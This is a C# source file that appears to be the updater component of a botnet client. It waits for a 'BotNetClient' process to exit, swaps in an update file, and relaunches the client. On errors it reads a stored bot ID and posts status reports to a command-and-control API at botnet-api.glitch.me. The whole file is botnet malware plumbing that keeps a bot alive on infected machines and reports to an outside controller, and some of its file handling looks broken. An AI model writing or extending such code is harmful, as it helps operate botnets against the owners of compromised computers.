using System;
using System.Net.Http;
using System.Web.Script.Serialization;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace Updater
{
    class Response
    {
        public int id { get; set; }
        public string response { get; set; }
    }
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                ServicePointManager.Expect100Continue = false;
                var processes = Process.GetProcesses();
                String pth = "System.Diagnostics.Process (BotNetClient)";
                string[] stringproc = new string[processes.Length];
                for (int i = 0; i < processes.Length; i++)
                {
                    stringproc[i] = processes[i].ToString();
                }
                while (true)
                {

                    if (Array.IndexOf(stringproc, pth) >= 0)
                    {
                        Array.Clear(processes, 0, processes.Length);
                        Array.Clear(stringproc, 0, stringproc.Length);
                        processes = Process.GetProcesses();
                        for (int i = 0; i < processes.Length; i++)
                        {
                            stringproc[i] = processes[i].ToString();
                        }
                    }
                    else
                    {
                        string date = DateTime.Today.ToLongDateString();
                        if (Directory.Exists(Environment.CurrentDirectory.ToString() + $"\\Update\\{date}"))
                        {
                            string filename = Directory.GetFiles(Environment.CurrentDirectory.ToString() + $"\\Update\\{date}")[0];
                            File.Delete(Environment.CurrentDirectory.ToString() + $"\\{filename}");
                            File.Move(Environment.CurrentDirectory.ToString() + $"\\Update\\{date}\\{filename}",
                                Environment.CurrentDirectory.ToString());
                            File.Delete("C:\\ProgramData\\idbtcU.txt");
                            Process.Start(Environment.CurrentDirectory.ToString() + "\\BotNetClient.exe");
                            Environment.Exit(0);
                        }
                        else
                        {
                            HttpClient client = new HttpClient();
                            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
                            Response resp = new Response
                            {
                                id = Convert.ToInt32(File.ReadAllText("C:\\ProgramData\\idbtcU.txt")),
                                response = "Ошибка обновления. Файл обновления не найден."
                            };
                            string json = new JavaScriptSerializer().Serialize(resp);
                            HttpResponseMessage httpResponseMessage = client.PostAsync($"/api/v1/responses/{resp.id}", new StringContent(json)).Result;
                            Process.Start(Environment.CurrentDirectory.ToString() + "\\BotNetClient.exe");
                            Environment.Exit(0);
                        }
                    }
                }
            }
            catch (Exception)
            {
                HttpClient client = new HttpClient();
                client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
                Response resp = new Response
                {
                    id = Convert.ToInt32(File.ReadAllText("C:\\ProgramData\\idbtcU.txt")),
                    response = "Неизвестная ошибка обновления."
                };
                string json = new JavaScriptSerializer().Serialize(resp);
                HttpResponseMessage httpResponseMessage = client.PostAsync($"/api/v1/responses/{resp.id}", new StringContent(json)).Result;
                Process.Start(Environment.CurrentDirectory.ToString() + "\\BotNetClient.exe");
                Environment.Exit(0);
            }
        }
    }
}
